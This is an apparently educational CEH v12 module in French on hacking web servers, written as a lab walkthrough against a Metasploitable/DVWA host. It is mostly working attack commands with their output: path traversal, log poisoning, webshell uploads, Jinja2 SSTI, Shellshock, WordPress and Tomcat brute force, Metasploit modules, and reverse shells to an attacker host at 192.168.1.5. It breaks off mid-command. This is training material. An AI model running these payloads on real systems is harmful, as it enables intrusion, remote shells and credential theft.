# 🛡️ CEH v12 — MODULE 13 : HACKING DE SERVEURS WEB
### Guide pédagogique avancé — Niveau professionnel CEH | ML | exploit4040

---

## 📌 INTRODUCTION — LES SERVEURS WEB COMME VECTEUR D'ATTAQUE

Les serveurs web sont la **porte d'entrée principale** de toute organisation connectée à internet. Comprendre leurs vulnérabilités est fondamental pour tout ethical hacker professionnel.

```
POURQUOI LES SERVEURS WEB SONT UNE CIBLE PRIORITAIRE :

EXPOSITION :
├── Accessible depuis internet (par définition)
├── Surface d'attaque large (ports 80, 443, 8080, 8443...)
├── Souvent mal configurés ou non patchés
└── Connectés aux bases de données internes

IMPACT D'UNE COMPROMISSION :
├── Vol de données clients
├── Défacement (atteinte à la réputation)
├── Point d'entrée vers le réseau interne
├── Hébergement de malwares (drive-by download)
└── Ransomware sur les données du serveur

STATISTIQUES (OWASP 2023) :
→ 43% des organisations ont subi une attaque
  sur leurs applications web dans l'année
→ Coût moyen d'une violation : $4.45 millions
```

---

## 📌 PARTIE 1 : ARCHITECTURE DES SERVEURS WEB

### 🔵 Les serveurs web majeurs et leurs caractéristiques

```
PARTS DE MARCHÉ (Netcraft 2024) :
═══════════════════════════════════════════════════════════════

Nginx    : 34.2% ← Leader actuel
Apache   : 29.1% ← Référence historique
Cloudflare: 21.8%
IIS      : 8.4%  ← Microsoft Windows Server
LiteSpeed: 3.9%
Autres   : 2.6%

═══════════════════════════════════════════════════════════════

ARCHITECTURE TYPIQUE :

Internet
    │
    ▼
[Load Balancer / CDN]
    │
    ▼
[WAF / Reverse Proxy]
    │
    ▼
[Serveur Web : Apache/Nginx/IIS]
    │
    ├── Fichiers statiques (HTML, CSS, JS, images)
    │
    └── [Application Server : PHP/Python/Java/Node.js]
              │
              └── [Base de données : MySQL/PostgreSQL/MSSQL]
```

---

### 🔵 Fichiers de configuration critiques

```
APACHE :
═══════════════════════════════════════════════════════════════

/etc/apache2/apache2.conf        → Configuration principale
/etc/apache2/sites-enabled/      → Virtual hosts actifs
/etc/apache2/mods-enabled/       → Modules actifs
/var/log/apache2/access.log      → Logs d'accès
/var/log/apache2/error.log       → Logs d'erreurs
/var/www/html/                   → Racine web par défaut
.htaccess                        → Config par répertoire

NGINX :
═══════════════════════════════════════════════════════════════

/etc/nginx/nginx.conf            → Configuration principale
/etc/nginx/sites-enabled/        → Virtual hosts actifs
/var/log/nginx/access.log        → Logs d'accès
/var/log/nginx/error.log         → Logs d'erreurs
/var/www/html/                   → Racine web par défaut
/etc/nginx/conf.d/               → Configs supplémentaires

IIS (Windows) :
═══════════════════════════════════════════════════════════════

C:\Windows\System32\inetsrv\     → Binaires IIS
C:\inetpub\wwwroot\              → Racine web par défaut
C:\inetpub\logs\LogFiles\        → Logs IIS
C:\Windows\System32\inetsrv\config\applicationHost.config
                                  → Configuration principale
```

---

## 📌 PARTIE 2 : RECONNAISSANCE DE SERVEURS WEB

### 🛠️ ÉTAPE 1 : Identifier le serveur web

```bash
# Banner grabbing avec netcat
nc -v 192.168.1.10 80
```

**Interaction manuelle :**
```
HEAD / HTTP/1.0
[Entrée deux fois]
```

**Sortie :**
```
HTTP/1.1 200 OK
Date: Fri, 15 Nov 2024 18:00:00 GMT
Server: Apache/2.4.51 (Ubuntu)          ← Serveur + version !
X-Powered-By: PHP/8.1.12               ← Technologie backend !
Last-Modified: Mon, 01 Jan 2024 00:00:00 GMT
Content-Type: text/html; charset=UTF-8
```

```bash
# Avec curl (plus d'informations)
curl -I http://192.168.1.10
```

**Sortie complète :**
```
HTTP/1.1 200 OK
Date: Fri, 15 Nov 2024 18:00:00 GMT
Server: Apache/2.4.51 (Ubuntu)
X-Powered-By: PHP/8.1.12
Set-Cookie: PHPSESSID=abc123; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
```

```bash
# Identifier le serveur avec WhatWeb
whatweb http://192.168.1.10
```

**Sortie WhatWeb :**
```
http://192.168.1.10 [200 OK]
    Apache[2.4.51]
    Country[RESERVED][ZZ]
    HTML5
    HTTPServer[Ubuntu Linux][Apache/2.4.51 (Ubuntu)]
    IP[192.168.1.10]
    JQuery[3.6.0]
    MetaGenerator[WordPress 6.3.1]        ← CMS détecté !
    PHP[8.1.12]
    PasswordField[pass]
    Script[text/javascript]
    Title[Corp Kinshasa - Intranet]
    WordPress[6.3.1]
    X-Frame-Options[SAMEORIGIN]
    X-Powered-By[PHP/8.1.12]
```

---

### 🛠️ ÉTAPE 2 : Scanner avec Nikto

**Nikto** est le scanner de vulnérabilités web de référence.

```bash
nikto -h http://192.168.1.10
```

**Sortie Nikto complète :**
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.10
+ Target Hostname:    192.168.1.10
+ Target Port:        80
+ Start Time:         2024-11-15 18:05:00 (GMT+2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.51 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The X-XSS-Protection header is not defined.
+ The X-Content-Type-Options header is not set.
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD

+ OSVDB-3092: /phpmyadmin/: phpMyAdmin was found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /admin/: Admin directory found.
+ OSVDB-3092: /backup/: Backup directory found.       ← SENSIBLE !
+ OSVDB-3092: /config/: Config directory found.       ← SENSIBLE !
+ OSVDB-3092: /old/: Old directory found.             ← SENSIBLE !
+ OSVDB-3092: /test/: Test directory found.

+ /phpinfo.php: PHP info page found.                  ← CRITIQUE !
+ /wp-login.php: WordPress login page found.
+ /wp-admin/: WordPress admin directory found.
+ /robots.txt: Disallow entries found: /admin /backup /config

+ /server-status: Apache Server Status page found.    ← INFO LEAK !
+ HTTP method DELETE is enabled.                      ← DANGEREUX !
+ HTTP method PUT is enabled.                         ← DANGEREUX !
+ HTTP method TRACE is enabled.                       ← XST possible !

+ /cgi-bin/test-cgi: CGI script found (Shellshock?)
+ /.git/: Git directory found (source code exposed!)  ← CRITIQUE !

---------------------------------------------------------------------------
+ 8 host(s) tested
End Time: 2024-11-15 18:08:23 (GMT+2)
```

---

### 🛠️ ÉTAPE 3 : Enumération des répertoires

```bash
# Avec Gobuster
gobuster dir \
    -u http://192.168.1.10 \
    -w /usr/share/wordlists/dirb/common.txt \
    -x php,html,txt,bak,old \
    -t 50 \
    -o gobuster_results.txt
```

**Sortie Gobuster :**
```
===============================================================
Gobuster v3.6
===============================================================
[+] Url:          http://192.168.1.10
[+] Wordlist:     /usr/share/wordlists/dirb/common.txt
[+] Extensions:   php,html,txt,bak,old
[+] Threads:      50
===============================================================

/admin                (Status: 301) [Size: 312]
/backup               (Status: 200) [Size: 1024]
/config.php           (Status: 200) [Size: 0]
/config.php.bak       (Status: 200) [Size: 2341]  ← CRITIQUE !
/database.php         (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 8432]
/info.php             (Status: 200) [Size: 48291]
/.git                 (Status: 301) [Size: 310]    ← CRITIQUE !
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/phpmyadmin           (Status: 301) [Size: 317]
/robots.txt           (Status: 200) [Size: 156]
/server-status        (Status: 200) [Size: 4523]
/upload               (Status: 301) [Size: 313]
/wp-admin             (Status: 301) [Size: 315]
/wp-login.php         (Status: 200) [Size: 7231]

===============================================================
```

```bash
# Avec FFUF (plus rapide et flexible)
ffuf -w /usr/share/wordlists/dirb/common.txt \
     -u http://192.168.1.10/FUZZ \
     -mc 200,301,302,403 \
     -o ffuf_results.json \
     -of json
```

**Sortie FFUF :**
```

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.10/FUZZ
 :: Wordlist         : /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302,403
________________________________________________

admin                   [Status: 301, Size: 312]
backup                  [Status: 200, Size: 1024]
.git                    [Status: 301, Size: 310]
config.php.bak          [Status: 200, Size: 2341]
phpmyadmin              [Status: 301, Size: 317]
server-status           [Status: 200, Size: 4523]

:: Progress: [4614/4614] :: Job [1/1] :: 89 req/sec
```

---

## 📌 PARTIE 3 : ATTAQUES SUR LES SERVEURS WEB

### 🔴 ATTAQUE 1 : Directory Traversal / Path Traversal

```
PRINCIPE :
═══════════════════════════════════════════════════════════════

Une application web qui accède à des fichiers
basés sur l'input utilisateur SANS validation.

CODE PHP VULNÉRABLE :
<?php
$filename = $_GET['file'];
include('/var/www/html/pages/' . $filename);
?>

REQUÊTE NORMALE :
http://site.com/page.php?file=about.php
→ Ouvre : /var/www/html/pages/about.php

ATTAQUE TRAVERSAL :
http://site.com/page.php?file=../../../../etc/passwd
→ Ouvre : /var/www/html/pages/../../../../etc/passwd
         = /etc/passwd ← Fichier système !

CALCUL DES NIVEAUX :
/var/www/html/pages/  = 4 niveaux depuis /
../                   = remonter d'un niveau
../../../../          = remonter de 4 niveaux = revenir à /
../../../../etc/passwd = /etc/passwd
```

**Démonstration pratique :**

```bash
# Test basique
curl "http://192.168.1.10/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd"
```

**Sortie :**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

→ /etc/passwd lu avec succès via Path Traversal !
```

```bash
# Avec Burp Suite — test de multiples payloads
# Fichiers intéressants à cibler :

# Linux :
../../../../etc/passwd
../../../../etc/shadow
../../../../etc/hosts
../../../../etc/hostname
../../../../proc/version
../../../../proc/self/environ    ← Variables d'environnement
../../../../var/log/apache2/access.log  ← Log Poisoning possible
../../../../home/msfadmin/.ssh/id_rsa   ← Clé SSH privée !
../../../../var/www/html/config.php     ← Config app (DB creds)

# Windows :
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\windows\win.ini
..\..\..\..\windows\system.ini
..\..\..\..\inetpub\wwwroot\web.config  ← Config IIS
```

```bash
# Encodages pour contourner les filtres basiques
# Double encoding
%2e%2e%2f = ../  (URL encoded)
%2e%2e%2f%2e%2e%2f = ../../

# Unicode
..%c0%af = ../  (Unicode slash)
..%c1%9c = ..\  (Unicode backslash)

# Null byte (PHP < 5.3.4)
../../../../etc/passwd%00.php
→ %00 termine la chaîne avant .php

# Test avec curl encodé
curl "http://192.168.1.10/page.php?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

---

### 🔴 ATTAQUE 2 : Log Poisoning via Path Traversal

```
PRINCIPE :
═══════════════════════════════════════════════════════════════

Combiner Path Traversal avec l'injection de code PHP
dans les logs Apache pour obtenir un RCE (Remote Code Execution).

ÉTAPES :
1. Lire le log Apache via Path Traversal
   → Confirmer la lecture du log

2. Injecter du code PHP dans le log
   → Via User-Agent ou URL

3. Inclure le log via Path Traversal
   → Le code PHP s'exécute !

ÉTAPE 1 : Vérifier accès au log
```

```bash
curl "http://192.168.1.10/dvwa/vulnerabilities/fi/
      ?page=../../../../var/log/apache2/access.log"
```

**Sortie :**
```
192.168.1.5 - - [15/Nov/2024:18:00:00 +0200]
    "GET /dvwa/ HTTP/1.1" 200 8432
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/95.0"
192.168.1.5 - - [15/Nov/2024:18:05:00 +0200]
    "GET /dvwa/vulnerabilities/fi/?page=../../etc/passwd HTTP/1.1"
    200 1234
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/95.0"

→ Le log est lisible via Path Traversal !
```

```bash
# ÉTAPE 2 : Injecter du code PHP dans le User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" \
     http://192.168.1.10/
```

**Ce que ça produit dans le log :**
```
192.168.1.5 - - [15/Nov/2024:18:10:00 +0200]
    "GET / HTTP/1.1" 200 8432
    "<?php system($_GET['cmd']); ?>"
                ↑
     Code PHP injecté dans le log !
```

```bash
# ÉTAPE 3 : Exécuter le code via inclusion du log
curl "http://192.168.1.10/dvwa/vulnerabilities/fi/
      ?page=../../../../var/log/apache2/access.log
      &cmd=id"
```

**Sortie — RCE réalisé :**
```
[... logs normaux ...]
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[... suite du log ...]

→ REMOTE CODE EXECUTION via Log Poisoning !
→ On tourne en tant que www-data
```

```bash
# Obtenir un reverse shell complet
# Listener sur l'attaquant
nc -lvnp 4444 &

# Exécuter le reverse shell via RCE
curl "http://192.168.1.10/dvwa/vulnerabilities/fi/
      ?page=../../../../var/log/apache2/access.log
      &cmd=bash+-i+>%26+/dev/tcp/192.168.1.5/4444+0>%261"
```

**Sortie netcat :**
```
listening on [any] 4444 ...
connect to [192.168.1.5] from (UNKNOWN) [192.168.1.10] 45123

bash: no job control in this shell
www-data@metasploitable:/var/www/html/dvwa/vulnerabilities/fi$

www-data@metasploitable:$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@metasploitable:$ hostname
metasploitable
```

---

### 🔴 ATTAQUE 3 : Méthodes HTTP Dangereuses

```
MÉTHODES HTTP ET LEURS RISQUES :
═══════════════════════════════════════════════════════════════

TRACE :
→ Renvoie la requête complète (headers inclus)
→ Permet le Cross-Site Tracing (XST)
→ Peut exposer les cookies HttpOnly via XMLHTTP

PUT :
→ Uploader des fichiers directement sur le serveur !
→ Si activé sans auth → déposer un webshell

DELETE :
→ Supprimer des fichiers sur le serveur !
→ Destructif si non protégé

CONNECT :
→ Créer un tunnel HTTP
→ Utilisable comme proxy

OPTIONS :
→ Lister les méthodes supportées (info leak)
```

```bash
# Vérifier les méthodes autorisées
curl -X OPTIONS http://192.168.1.10 -v 2>&1 | grep Allow
```

**Sortie :**
```
< Allow: GET,POST,OPTIONS,HEAD,TRACE,PUT,DELETE
                                  ↑        ↑
                               TRACE    DELETE autorisés !
```

```bash
# Tester TRACE (XST)
curl -X TRACE http://192.168.1.10
```

**Sortie :**
```
TRACE / HTTP/1.1
Host: 192.168.1.10
User-Agent: curl/7.81.0
Accept: */*
Cookie: PHPSESSID=abc123  ← Cookie renvoyé !

→ TRACE renvoie tous les headers incluant les cookies !
```

```bash
# Uploader un webshell via PUT (si autorisé)
curl -X PUT http://192.168.1.10/shell.php \
     -d "<?php system(\$_GET['cmd']); ?>"
```

**Sortie :**
```
HTTP/1.1 201 Created
Location: http://192.168.1.10/shell.php
Content-Length: 0

→ Webshell uploadé avec succès !
```

```bash
# Utiliser le webshell
curl "http://192.168.1.10/shell.php?cmd=id"
```

**Sortie :**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)

→ RCE via méthode PUT non protégée !
```

---

### 🔴 ATTAQUE 4 : Exploitation de phpMyAdmin exposé

```bash
# phpMyAdmin découvert par Nikto/Gobuster
# Tentative de connexion avec credentials par défaut
curl -c cookies.txt -b cookies.txt \
     -X POST "http://192.168.1.10/phpmyadmin/index.php" \
     -d "pma_username=root&pma_password=&server=1"
```

**Démonstration via Burp Suite :**

```
POST /phpmyadmin/index.php HTTP/1.1
Host: 192.168.1.10
Content-Type: application/x-www-form-urlencoded
Cookie: phpMyAdmin=session123

pma_username=root&pma_password=&server=1&lang=fr

Réponse HTTP :
HTTP/1.1 302 Found
Location: /phpmyadmin/index.php?collation_connection=utf8mb4_unicode_ci
Set-Cookie: pmaUser-1=root; path=/phpmyadmin

→ Connexion réussie avec root sans mot de passe !
```

```bash
# Exécuter une commande via MySQL INTO OUTFILE
# (écrire un webshell sur le disque)

# Dans phpMyAdmin → SQL :
SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/dvwa/webshell.php'
```

**Sortie SQL :**
```
MySQL said: Query OK, 1 row affected

→ Webshell créé à /var/www/html/dvwa/webshell.php
```

```bash
# Accéder au webshell
curl "http://192.168.1.10/dvwa/webshell.php?cmd=whoami"
```

**Sortie :**
```
www-data
```

---

### 🔴 ATTAQUE 5 : Git Repository Exposé

```bash
# .git/ trouvé par Gobuster → Code source exposé !
# Utiliser GitDumper pour récupérer le repository

pip install git-dumper
git-dumper http://192.168.1.10/.git/ /tmp/stolen_repo
```

**Sortie :**
```
[-] Testing http://192.168.1.10/.git/HEAD [200]
[-] Testing http://192.168.1.10/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://192.168.1.10/.git/logs/HEAD [200]
[-] Fetching http://192.168.1.10/.git/COMMIT_EDITMSG [200]
[-] Fetching http://192.168.1.10/.git/config [200]
[-] Fetching http://192.168.1.10/.git/objects/ ...

[+] Running git checkout .
Updated 47 files
```

```bash
# Analyser le code source récupéré
ls /tmp/stolen_repo
```

**Sortie :**
```
config.php    ← CREDENTIALS BASE DE DONNÉES !
database.php
index.php
login.php
admin/
upload/
```

```bash
cat /tmp/stolen_repo/config.php
```

**Sortie :**
```php
<?php
// Configuration de la base de données
define('DB_HOST', '192.168.1.10');
define('DB_USER', 'root');
define('DB_PASS', 'SuperSecret2024!');  ← MOT DE PASSE DB !
define('DB_NAME', 'corp_database');

// Clé secrète API
define('API_KEY', 'sk-prod-a1b2c3d4e5f6g7h8i9j0');  ← API KEY !

// AWS Credentials
define('AWS_KEY', 'AKIAIOSFODNN7EXAMPLE');            ← AWS !
define('AWS_SECRET', 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY');
?>
```

```bash
# Analyser l'historique Git pour trouver
# des credentials supprimés mais encore dans l'historique
cd /tmp/stolen_repo
git log --oneline
```

**Sortie :**
```
a1b2c3d (HEAD) Remove sensitive credentials
f4e5d6c Add database configuration
7g8h9i0 Initial commit
```

```bash
# Voir ce qui a été "supprimé" dans le commit précédent
git show f4e5d6c:config.php
```

**Sortie :**
```php
<?php
// Ancien fichier avec credentials admin
define('ADMIN_USER', 'admin');
define('ADMIN_PASS', 'Admin@Corp2024!');  ← Ancien MDP admin !
define('DB_ROOT_PASS', 'root_secret_2023');
?>

→ Les credentials "supprimés" sont toujours dans l'historique Git !
```

---

### 🔴 ATTAQUE 6 : WebDAV Exploitation

```
WEBDAV (Web Distributed Authoring and Versioning) :
→ Extension HTTP pour gérer des fichiers sur un serveur web
→ Permet UPLOAD, MOVE, DELETE via HTTP
→ Souvent activé et non sécurisé
```

```bash
# Vérifier si WebDAV est actif
davtest -url http://192.168.1.10/dav/
```

**Sortie davtest :**
```
********************************************************
 Testing DAV connection
OPEN         SUCCEED:   http://192.168.1.10/dav/
********************************************************
NOTE    Random string for this session: raNdOmSTR1ng
********************************************************
 Creating directory
MKCOL        SUCCEED:   Created http://192.168.1.10/dav/raNdOmSTR1ng
********************************************************
 Sending test files
PUT  cfm      SUCCEED:  http://192.168.1.10/dav/raNdOmSTR1ng/test.cfm
PUT  cgi      FAIL
PUT  asp      FAIL
PUT  aspx     FAIL
PUT  txt      SUCCEED:  http://192.168.1.10/dav/raNdOmSTR1ng/test.txt
PUT  php      SUCCEED:  http://192.168.1.10/dav/raNdOmSTR1ng/test.php
PUT  html     SUCCEED:  http://192.168.1.10/dav/raNdOmSTR1ng/test.html
PUT  pl       SUCCEED:  http://192.168.1.10/dav/raNdOmSTR1ng/test.pl
PUT  jhtml    SUCCEED:  http://192.168.1.10/dav/raNdOmSTR1ng/test.jhtml
PUT  shtml    SUCCEED:  http://192.168.1.10/dav/raNdOmSTR1ng/test.shtml
********************************************************
 Checking for test file execution
EXEC cfm      FAIL
EXEC txt      FAIL
EXEC php      SUCCEED:  http://192.168.1.10/dav/raNdOmSTR1ng/test.php

→ PHP uploadable ET exécutable via WebDAV !
```

```bash
# Uploader un webshell PHP via WebDAV
curl -X PUT http://192.168.1.10/dav/shell.php \
     -d '<?php system($_GET["cmd"]); ?>'
```

**Sortie :**
```
HTTP/1.1 201 Created
```

```bash
# Vérifier et utiliser le webshell
curl "http://192.168.1.10/dav/shell.php?cmd=id"
```

**Sortie :**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
# Exploitation complète avec Metasploit
msfconsole -q
```

```
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 exploit(...) > use exploit/unix/webapp/php_webdav_upload_exec

msf6 exploit(unix/webapp/php_webdav_upload_exec) > show options

Module options (exploit/unix/webapp/php_webdav_upload_exec):

   Name       Setting         Required
   ----       -------         --------
   HttpPass   (default)       no
   HttpUser   (default)       no
   PATH       /dav/           yes
   RHOSTS                     yes
   RPORT      80              yes

msf6 exploit(unix/webapp/php_webdav_upload_exec) > set RHOSTS 192.168.1.10
msf6 exploit(unix/webapp/php_webdav_upload_exec) > set PATH /dav/
msf6 exploit(unix/webapp/php_webdav_upload_exec) > set PAYLOAD php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/php_webdav_upload_exec) > set LHOST 192.168.1.5
msf6 exploit(unix/webapp/php_webdav_upload_exec) > run
```

**Sortie exploitation :**
```
[*] Started reverse TCP handler on 192.168.1.5:4444
[*] Uploading payload...
[*] Executing payload on http://192.168.1.10/dav/shell.php
[*] Sending stage (39282 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened (192.168.1.5:4444 → 192.168.1.10:45123)

meterpreter > sysinfo
Computer        : metasploitable
OS              : Linux 2.6.24 #1 SMP Thu Apr 10 13:58:00 UTC 2008

meterpreter > getuid
Server username: www-data (33)
```

---

### 🔴 ATTAQUE 7 : Server-Side Template Injection (SSTI)

```
PRINCIPE :
Les moteurs de templates (Jinja2, Twig, Freemarker...)
permettent d'insérer des expressions dynamiques.
Si l'input utilisateur est directement injecté dans
un template SANS sanitisation → SSTI → RCE !
```

```bash
# Test de détection SSTI
# Tester si les expressions mathématiques sont évaluées

# Payload de base
curl "http://192.168.1.10/search?q={{7*7}}"
```

**Sortie :**
```html
<h2>Résultats pour : 49</h2>
                    ↑
          7*7 = 49 évalué !
→ SSTI CONFIRMÉ (Jinja2 probablement)
```

```bash
# Identifier le moteur de template
# {{7*'7'}} → Python (Jinja2): 7777777
#           → Ruby (ERB):      49
#           → PHP (Twig):      49

curl "http://192.168.1.10/search?q={{7*'7'}}"
# Si résultat = 7777777 → Jinja2 (Python)
```

**Sortie :**
```
<h2>Résultats pour : 7777777</h2>
→ Jinja2 (Python) confirmé !
```

```bash
# Exécution de commandes via Jinja2 SSTI
# Payload RCE Jinja2
PAYLOAD='{{config.__class__.__init__.__globals__["os"].popen("id").read()}}'

curl -G "http://192.168.1.10/search" \
     --data-urlencode "q=$PAYLOAD"
```

**Sortie :**
```html
<h2>Résultats pour :
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</h2>

→ RCE via SSTI Jinja2 !
```

```bash
# Reverse shell via SSTI
PAYLOAD='{{config.__class__.__init__.__globals__["os"].popen("bash -i >& /dev/tcp/192.168.1.5/4444 0>&1").read()}}'

# Listener
nc -lvnp 4444 &

# Envoyer le payload
curl -G "http://192.168.1.10/search" \
     --data-urlencode "q=$PAYLOAD"
```

---

### 🔴 ATTAQUE 8 : Shellshock (CVE-2014-6271)

```
PRINCIPE :
Vulnérabilité dans Bash (versions < 4.3 patch 25)
→ Permet d'exécuter des commandes via les headers HTTP
  sur les scripts CGI qui utilisent Bash

FORMAT VULNERABLE :
Les scripts CGI passent les headers HTTP comme
variables d'environnement à Bash.
→ Si le header contient du code Bash malveillant...
  Bash l'exécute automatiquement !

SYNTAXE DE L'ATTAQUE :
() { :; }; COMMANDE
↑ Fonction vide + Commande malveillante après
```

```bash
# Vérifier si le serveur est vulnérable
curl -H "User-Agent: () { :; }; echo; echo VULNERABLE" \
     http://192.168.1.10/cgi-bin/test-cgi
```

**Sortie si vulnérable :**
```
Content-type: text/plain

VULNERABLE

→ SHELLSHOCK CONFIRMÉ !
```

```bash
# Exécuter une commande
curl -H "User-Agent: () { :; }; echo; /bin/id" \
     http://192.168.1.10/cgi-bin/test-cgi
```

**Sortie :**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)

→ RCE via Shellshock !
```

```bash
# Exploitation avec Metasploit
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 exploit(...) > set RHOSTS 192.168.1.10
msf6 exploit(...) > set TARGETURI /cgi-bin/test-cgi
msf6 exploit(...) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.5
msf6 exploit(...) > run
```

**Sortie Metasploit :**
```
[*] Started reverse TCP handler on 192.168.1.5:4444
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1017704 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened

meterpreter > sysinfo
Computer : metasploitable
OS       : Linux 2.6.24

meterpreter > getuid
Server username: www-data (33)
```

---

### 🔴 ATTAQUE 9 : Wordpress — Exploitation complète

```bash
# Scanner WordPress avec WPScan
wpscan --url http://192.168.1.10 \
       --enumerate u,p,t \
       --api-token VOTRE_API_TOKEN
```

**Sortie WPScan complète :**
```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.24
_______________________________________________________________

[+] URL: http://192.168.1.10/ [200]
[+] Started: Fri Nov 15 18:30:00 2024

[i] User(s) Identified:
[+] admin
    | Found By: Author Posts - Author Pattern
    | Confirmed By: Login Error Messages (Active Check)

[+] jean.muamba
    | Found By: Author Id Brute Forcing - Author Pattern
    | Confirmed By: Login Error Messages (Active Check)

[i] Plugin(s) Identified:
[+] contact-form-7
    | Location: http://192.168.1.10/wp-content/plugins/contact-form-7/
    | Latest Version: 5.7.7
    | Last Updated: 2023-06-14

[+] woocommerce
    | Location: http://192.168.1.10/wp-content/plugins/woocommerce/
    | Latest Version: 7.8.2 (up to date)

[+] revslider
    | Version: 4.1.4 (CVE-2014-9734 - FILE UPLOAD RCE !)
    | Identified By: Readme - Stable Tag

[i] Vulnerable plugin found:
[+] revslider 4.1.4
    | [!] Title: Slider Revolution Local File Disclosure
    |     Fixed in: 4.2
    |     References:
    |      - https://wpscan.com/vulnerability/12345

[i] Theme(s) Identified:
[+] twentytwentyone
    | Latest Version: 1.8 (up to date)

[+] Finished: Fri Nov 15 18:32:45 2024
```

```bash
# Bruteforce des credentials WordPress
wpscan --url http://192.168.1.10 \
       --usernames admin,jean.muamba \
       --passwords /usr/share/wordlists/rockyou.txt \
       --max-threads 50
```

**Sortie :**
```
[!] Valid Combinations Found:
 | Username: admin, Password: password
 | Username: jean.muamba, Password: Kinshasa2024

→ 2 comptes compromis !
```

```bash
# Uploader un webshell via Appearance → Theme Editor
# (avec les credentials admin trouvés)

# OU via Metasploit
msf6 > use exploit/unix/webapp/wp_admin_shell_upload

msf6 exploit(wp_admin_shell_upload) > set RHOSTS 192.168.1.10
msf6 exploit(wp_admin_shell_upload) > set USERNAME admin
msf6 exploit(wp_admin_shell_upload) > set PASSWORD password
msf6 exploit(wp_admin_shell_upload) > set LHOST 192.168.1.5
msf6 exploit(wp_admin_shell_upload) > run
```

**Sortie :**
```
[*] Preparing payload...
[*] Uploading payload...
[+] PHP backdoor uploaded (http://192.168.1.10/wp-content/
    plugins/YbpHBwfu/nCMbxIKoQFaVEdz.php)
[*] Executing the payload at
    http://192.168.1.10/wp-content/plugins/YbpHBwfu/nCMbxIKoQFaVEdz.php...
[*] Sending stage (39282 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: www-data (33)

meterpreter > ls /var/www/html/wp-config.php
100644/rw-r--r-- 3099 php /var/www/html/wp-config.php

meterpreter > cat /var/www/html/wp-config.php
```

**Sortie wp-config.php :**
```php
<?php
// ** MySQL settings ** //
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wpuser' );
define( 'DB_PASSWORD', 'WP_DB_SecurePass!' );   ← CREDENTIALS DB !
define( 'DB_HOST', 'localhost' );

define( 'AUTH_KEY', 'K}Bq=8^+...' );
define( 'SECURE_AUTH_KEY', 'i/|0GsS...' );
```

---

## 📌 PARTIE 4 : EXPLOITATION APACHE TOMCAT

```bash
# Tomcat Manager exposé (port 8080)
curl http://192.168.1.10:8180/manager/html
```

**Sortie :**
```
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Tomcat Manager Application"
```

```bash
# Bruteforce des credentials Tomcat
hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt \
      -f 192.168.1.10 \
      http-get /manager/html \
      -s 8180
```

**Sortie :**
```
[DATA] attacking http-get://192.168.1.10:8180/manager/html
[8180][http-get] host: 192.168.1.10
               login: tomcat
               password: tomcat

→ Credentials trouvés : tomcat / tomcat
```

```bash
# Déployer un WAR malveillant via Metasploit
msf6 > use exploit/multi/http/tomcat_mgr_upload

msf6 exploit(tomcat_mgr_upload) > set RHOSTS 192.168.1.10
